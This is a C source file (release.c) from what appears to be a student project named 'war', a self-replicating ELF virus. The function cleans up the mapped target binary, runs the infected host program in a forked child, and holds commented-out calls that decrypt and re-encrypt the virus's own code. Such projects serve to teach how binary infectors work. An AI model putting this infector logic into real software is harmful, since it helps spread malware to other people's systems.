/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   release.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/11 00:01:22 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Release: e_e
*/
void		release(t_data *data)
{
	/* revert_two(&data->key, (char*)inject, (size_t)release - (size_t)patch); */

#ifdef DEBUG
	char de[] = "release\t\t0\n";
	data->context == true ?	de[9] = 49 : 0;
	_log(de, _strlen(de));
#endif

	_close(data->bin.fd);
	_munmap(data->bin.map, data->bin.size);
	if (data->context != true)
		goto next;

	pid_t child;
	char *av[2] = {data->name, "--help"};
	child = _fork();
	if (child == 0)
	{
		_execve(data->name, av, NULL);
		_exit(0);
	}

	/* disabled due to mysterious segfault in infected binary that pop out of nowhere */
	/* update_two(&data->key, (char*)release, (size_t)end - (size_t)release); */
	/* revert_two(&data->key, (char*)end, (size_t)update_one - (size_t)end); */

next:
	end(data);
}
